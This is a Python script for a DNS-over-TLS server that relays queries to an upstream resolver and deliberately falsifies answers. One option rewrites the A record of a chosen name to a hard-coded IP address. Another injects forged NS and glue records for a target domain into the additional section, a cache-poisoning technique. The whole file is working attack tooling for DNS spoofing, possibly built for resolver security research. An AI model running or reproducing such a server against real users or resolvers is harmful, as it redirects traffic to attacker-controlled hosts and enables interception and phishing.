import argparse
import asyncio
import ssl
import socket
import dns.asyncquery
import dns.message
import dns.rcode
import dns.flags
import dns.message
import dns.rrset
from dnslib import DNSRecord

async def handle_client(reader, writer):
    request_data = await reader.read(1024)
    request =  dns.message.from_wire(request_data[2:])
    #print(request)
    dns_request = dns.message.make_query(request.question[0].name, request.question[0].rdtype)
    dns_request.id = request.id
    #print(dns_request)
    dns_response = await dns.asyncquery.udp(q=dns_request, port=53, where='223.5.5.5')
    #print(dns_response)
    if str(request.question[0].name) == tamper and int(request.question[0].rdtype) == 1:
        print('---tamper---', tamper)
        dns_response.answer = [dns.rrset.from_text(tamper, 3600, dns.rdataclass.IN, dns.rdatatype.A, '39.106.44.126')]
    if str(request.question[0].name) == inject:
        print('---inject---', inject)
        dns_response.additional = [dns.rrset.from_text(inject,3600,dns.rdataclass.IN, dns.rdatatype.NS,'ns.'+inject.split('.',1)[1]),
                                   dns.rrset.from_text('ns.'+inject.split('.',1)[1],3600,dns.rdataclass.IN, dns.rdatatype.A,ns)]
    #print(dns_response)

    response_data = dns_response
    record_header = len(response_data.to_wire()).to_bytes(2, 'big')
    # 构建完整的TLS响应数据
    tls_response_data = record_header + response_data.to_wire()
    writer.write(tls_response_data)
    await writer.drain()
    writer.close()

async def start_server():
    # 配置服务器参数
    listen_address = '0.0.0.0'
    listen_port = 853
    CERT_FILE = "/usr/local/etc/unbound/cert_new4/app.crt"  # 替换为你的SSL证书文件路径
    KEY_FILE = "/usr/local/etc/unbound/cert_new4/app.key"  # 替换为你的SSL密钥文件路径
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
    # 创建TCP服务器
    server = await asyncio.start_server(
        handle_client, listen_address, listen_port, ssl=context)

    print(f'DoT server listening on {listen_address}:{listen_port}')
    async with server:
        await server.serve_forever()

parser = argparse.ArgumentParser()
parser.add_argument('-tamper', '--tamper', default='')
parser.add_argument('-inject', '--inject', default='')
parser.add_argument('-ns', '--ns', default='39.106.44.126')
args = parser.parse_args()
tamper = args.tamper +'.'
inject = args.inject +'.'
ns = args.ns
asyncio.run(start_server())